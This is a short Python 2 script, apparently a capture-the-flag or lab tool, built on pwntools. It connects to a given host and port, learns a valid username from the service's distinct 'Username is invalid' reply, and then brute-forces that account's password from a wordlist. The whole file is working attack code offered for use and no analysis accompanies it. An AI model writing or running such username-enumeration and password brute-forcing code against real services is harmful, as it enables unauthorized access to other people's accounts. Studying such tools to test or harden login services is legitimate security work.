from pwn import *
import sys

def ParseFile( filename ):
	fd = open( filename, 'r' )
	buf = fd.read().split( '\n' )
	fd.close()

	return buf

if __name__ == "__main__":

	if len( sys.argv ) > 4:
		host = sys.argv[ 1 ]
		port = int( sys.argv[ 2 ] )
		login_dict = sys.argv[ 3 ]
		passwd_dict = sys.argv[ 4 ] 
	else:
		print "Usage python " + sys.argv[ 0 ] + " <host> <port> <login_file> <passwd_file>"
		sys.exit( -1 )

	logins = ParseFile( login_dict )
	passwords = ParseFile( passwd_dict )

	valid_username = ''

	for login in logins:
		client = remote( host, port )

		client.recvuntil( "username: " )
		client.send( login + "\n" )

		answ = client.recv()
		
		if "Username is invalid" in answ:
			client.close()
			continue
		else:
			print "[+] Valid username is <%s>" % login
			valid_username = login
			client.close()
			break

	for password in passwords:
		client = remote( host, port )

		client.recvuntil( "username: " )
		client.send( valid_username + "\n" )

		client.recvuntil( "password: " )
		client.send( password + "\n" )

		answ = client.recv() 

		if "Password is invalid" in answ:
			client.close()
			continue
		else:
			print "[+] Valid password is <%s>" % password
			client.close()
			break

